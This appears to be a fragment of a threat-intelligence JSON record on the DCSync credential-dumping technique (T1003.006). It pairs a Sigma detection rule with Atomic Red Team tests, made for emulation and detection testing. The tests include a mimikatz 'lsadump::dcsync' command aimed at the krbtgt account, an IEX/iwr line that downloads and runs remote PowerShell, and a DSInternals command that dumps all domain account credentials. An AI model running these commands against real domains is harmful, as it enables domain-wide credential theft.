+                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/07/26\ndescription: Detects potential abuse of Active Directory Replication Service (ADRS)\n  from a non machine account to request credentials.\ndetection:\n  condition: selection and not filter\n  filter:\n  - SubjectUserName|endswith: $\n  - SubjectUserName|startswith: MSOL_\n  selection:\n    AccessMask: '0x100'\n    EventID: 4662\n    Properties|contains:\n    - 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\n    - 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\n    - 89e95b76-444d-4c62-991a-0facbeda640c\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- SubjectDomainName\n- SubjectUserName\nid: 17d619c1-e020-4347-957e-1d1207455c93\nlevel: critical\nlogsource:\n  product: windows\n  service: security\nmodified: 2021/11/27\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-180815210510.html\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.006\ntitle: Active Directory Replication from Non Machine Account\n",
+                            "sigma:id": "17d619c1-e020-4347-957e-1d1207455c93",
+                            "title": "Active Directory Replication from Non Machine Account",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1003.006",
+                "display_name": "OS Credential Dumping: DCSync",
+                "atomic_tests": [
+                    {
+                        "name": "DCSync (Active Directory)",
+                        "auto_generated_guid": "129efd28-8497-4c87-a1b0-73b9a870ca3e",
+                        "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "domain": {
+                                "description": "Targeted Active Directory domain",
+                                "type": "string",
+                                "default": "%userdnsdomain%"
+                            },
+                            "user": {
+                                "description": "Targeted user",
+                                "type": "string",
+                                "default": "krbtgt"
+                            },
+                            "mimikatz_path": {
+                                "description": "Mimikatz windows executable",
+                                "type": "path",
+                                "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+                                "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": false,
+                            "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n"
+                        }
+                    },
+                    {
+                        "name": "Run DSInternals Get-ADReplAccount",
+                        "auto_generated_guid": "a0bced08-3fc5-4d8b-93b7-e8344739376e",
+                        "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "logonserver": {
+                                "description": "ComputerName argument default %logonserver%",
+                                "type": "string",
+                                "default": "$ENV:logonserver.TrimStart(\"\\\")"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "DSInternals must be installed\n",
+                                "prereq_command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}\n",
+                                "get_prereq_command": "Install-Module -Name DSInternals -Scope CurrentUser -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Get-ADReplAccount -All -Server #{logonserver}\n",
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 10:42:02"
+}
